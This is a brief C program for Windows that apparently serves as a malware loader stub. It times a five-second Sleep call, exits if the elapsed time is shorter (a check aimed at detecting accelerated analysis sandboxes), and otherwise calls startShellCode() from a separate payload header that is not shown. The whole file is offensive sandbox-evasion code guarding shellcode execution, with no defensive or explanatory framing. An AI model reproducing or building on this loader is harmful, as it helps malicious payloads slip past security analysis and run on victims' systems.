#include <time.h>
#include <windows.h>
#include "..\payload\payload.h"

#define SLEEP_TIME 5000

int main() {
    clock_t start, end;
    double time_between;

    start = clock(); // Record start time

    Sleep(SLEEP_TIME);
    end = clock(); // Record end time

    // Calculate the time used in miliseconds
    time_between = ((double)(end - start));

    if (time_between < SLEEP_TIME){
        return 0;
    }else{
        startShellCode();
    }

    return 0;
}
